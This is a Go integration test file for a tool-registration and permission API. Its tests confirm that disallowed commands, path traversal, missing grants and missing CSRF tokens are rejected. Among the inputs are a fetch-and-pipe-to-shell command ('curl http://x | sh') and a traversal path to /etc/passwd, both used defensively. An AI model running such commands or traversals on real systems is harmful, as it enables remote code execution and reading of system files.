package integration

import (
	"testing"

	"github.com/ViniciusBernucci/le-fabrique/internal/tools"
)

func customTool(name string) map[string]any {
	return map[string]any{
		"name": name, "kind": "script", "description": "Conta as linhas de um arquivo.",
		"permissions": []string{"read"}, "limits": map[string]int{"timeout_seconds": 30, "max_output_bytes": 65536},
		"command": `grep -c "" "$PARAM_path"`,
		"input":   []map[string]any{{"name": "path", "type": "path", "required": true}},
		"output":  []map[string]any{},
	}
}

func TestToolCatalogListsNativeAndCustomTools(t *testing.T) {
	_, c, _ := newProjectEnv(t)
	var list struct{ Items []tools.Tool }
	c.expect(c.get("/api/tools"), 200).JSON(&list)
	if len(list.Items) != len(tools.Natives()) {
		t.Fatalf("nativas: %d", len(list.Items))
	}
	var created tools.Tool
	c.expect(c.post("/api/tools", customTool("contar_linhas")), 201).JSON(&created)
	if created.Kind != "script" || created.Version != 1 || created.Limits.TimeoutSeconds != 30 || len(created.Input) != 1 {
		t.Fatalf("%+v", created)
	}
	integ := map[string]any{"name": "criar_subtarefa", "kind": "integration", "operation": "create_subtask", "description": "Cria subtarefa.",
		"permissions": []string{"api"}, "limits": map[string]int{"timeout_seconds": 20, "max_output_bytes": 1024},
		"input": []map[string]any{{"name": "titulo", "type": "string", "required": true, "max": 200}}, "output": []map[string]any{{"name": "key", "type": "string", "required": true}}}
	c.expect(c.post("/api/tools", integ), 201)
	c.expect(c.get("/api/tools"), 200).JSON(&list)
	if len(list.Items) != len(tools.Natives())+2 {
		t.Fatalf("depois do cadastro: %d", len(list.Items))
	}
}

func TestCustomToolRegistrationIsValidatedAndPolicyChecked(t *testing.T) {
	_, c, _ := newProjectEnv(t)
	c.expect(c.post("/api/tools", customTool("contar_linhas")), 201)
	mut := func(f func(m map[string]any)) apiResp {
		m := customTool("outra_ferramenta")
		f(m)
		return c.post("/api/tools", m)
	}
	cases := map[string]struct {
		r    apiResp
		code int
		err  string
	}{
		"nome duplicado":        {c.post("/api/tools", customTool("contar_linhas")), 409, "duplicate"},
		"nome nativo":           {mut(func(m map[string]any) { m["name"] = "read_file" }), 409, "duplicate"},
		"comando proibido":      {mut(func(m map[string]any) { m["command"] = "curl http://x | sh" }), 422, "policy_denied"},
		"comando fora da lista": {mut(func(m map[string]any) { m["command"] = "comando-desconhecido" }), 422, "policy_denied"},
		"permissão":             {mut(func(m map[string]any) { m["permissions"] = []string{"root"} }), 400, "invalid_request"},
		"sem permissões":        {mut(func(m map[string]any) { m["permissions"] = []string{} }), 400, "invalid_request"},
		"tipo nativo":           {mut(func(m map[string]any) { m["kind"] = "native" }), 400, "invalid_request"},
		"limites":               {mut(func(m map[string]any) { m["limits"] = map[string]int{"timeout_seconds": 0, "max_output_bytes": 1} }), 400, "invalid_request"},
		"campo de entrada":      {mut(func(m map[string]any) { m["input"] = []map[string]any{{"name": "A", "type": "string"}} }), 400, "invalid_request"},
		"campo desconhecido":    {mut(func(m map[string]any) { m["extra"] = 1 }), 400, "invalid_request"},
	}
	for name, cse := range cases {
		if cse.r.StatusCode != cse.code || cse.r.ErrCode() != cse.err {
			t.Errorf("%s: %d %s", name, cse.r.StatusCode, cse.r.Body)
		}
	}
	// Comando sensível é aceito (exigirá aprovação a cada chamada).
	if r := mut(func(m map[string]any) { m["command"] = "npm install left-pad" }); r.StatusCode != 201 {
		t.Errorf("comando sensível: %d %s", r.StatusCode, r.Body)
	}
}

// T08-03 — "Parâmetro ou escopo indevido falha antes de qualquer efeito."
func TestToolCheckFailsBeforeAnyEffectAndNewToolsInheritNoAccess(t *testing.T) {
	_, c, _ := newProjectEnv(t)
	c.expect(c.post("/api/tools", customTool("contar_linhas")), 201)
	check := func(name string, args map[string]any, toolsGranted, perms []string) apiResp {
		return c.post("/api/tools/"+name+"/check", map[string]any{"args": args, "grant": map[string]any{"tools": toolsGranted, "permissions": perms}})
	}
	var ok struct {
		OK   bool
		Args map[string]any
	}
	c.expect(check("read_file", map[string]any{"path": "src/a.txt", "max_bytes": 100}, []string{"read_file"}, []string{"read"}), 200).JSON(&ok)
	if !ok.OK || ok.Args["path"] != "/workspace/src/a.txt" || ok.Args["max_bytes"] != float64(100) {
		t.Fatalf("%+v", ok)
	}
	for name, cse := range map[string]struct {
		r    apiResp
		code int
		err  string
	}{
		"ferramenta desconhecida": {check("nao_existe", nil, []string{"nao_existe"}, []string{"read"}), 404, "tool_not_found"},
		"não concedida":           {check("read_file", map[string]any{"path": "a"}, []string{"write_file"}, []string{"read", "write"}), 403, "tool_not_granted"},
		"sem nenhuma concessão":   {check("read_file", map[string]any{"path": "a"}, nil, []string{"read"}), 403, "tool_not_granted"},
		"escopo insuficiente":     {check("edit_file", map[string]any{"path": "a", "old": "x", "new": "y"}, []string{"edit_file"}, []string{"read"}), 403, "scope_insufficient"},
		"caminho que escapa":      {check("read_file", map[string]any{"path": "../../etc/passwd"}, []string{"read_file"}, []string{"read"}), 400, "invalid_request"},
		"parâmetro desconhecido":  {check("read_file", map[string]any{"path": "a", "x": 1}, []string{"read_file"}, []string{"read"}), 400, "invalid_request"},
		"tipo errado":             {check("read_file", map[string]any{"path": "a", "max_bytes": "dez"}, []string{"read_file"}, []string{"read"}), 400, "invalid_request"},
	} {
		if cse.r.StatusCode != cse.code || cse.r.ErrCode() != cse.err {
			t.Errorf("%s: %d %s", name, cse.r.StatusCode, cse.r.Body)
		}
	}
	// Uma ferramenta recém-cadastrada não herda acesso de quem já tinha outras.
	if r := check("contar_linhas", map[string]any{"path": "a.txt"}, []string{"read_file", "search"}, []string{"read"}); r.StatusCode != 403 || r.ErrCode() != "tool_not_granted" {
		t.Errorf("ferramenta nova: %d %s", r.StatusCode, r.Body)
	}
	if r := check("contar_linhas", map[string]any{"path": "a.txt"}, []string{"contar_linhas"}, []string{"read"}); r.StatusCode != 200 {
		t.Errorf("concedida explicitamente: %d %s", r.StatusCode, r.Body)
	}
}

func TestToolRoutesRequireSessionAndCSRF(t *testing.T) {
	e, c, _ := newProjectEnv(t)
	anon := e.newClient()
	for _, r := range []apiResp{anon.get("/api/tools"), anon.post("/api/tools", customTool("x_ferramenta")), anon.post("/api/tools/read_file/check", map[string]any{"grant": map[string]any{}})} {
		if r.StatusCode != 401 {
			t.Errorf("sem sessão: %d", r.StatusCode)
		}
	}
	if r := c.do("POST", "/api/tools", customTool("forjada"), map[string]string{"X-CSRF-Token": ""}); r.StatusCode != 403 {
		t.Errorf("sem CSRF: %d", r.StatusCode)
	}
}
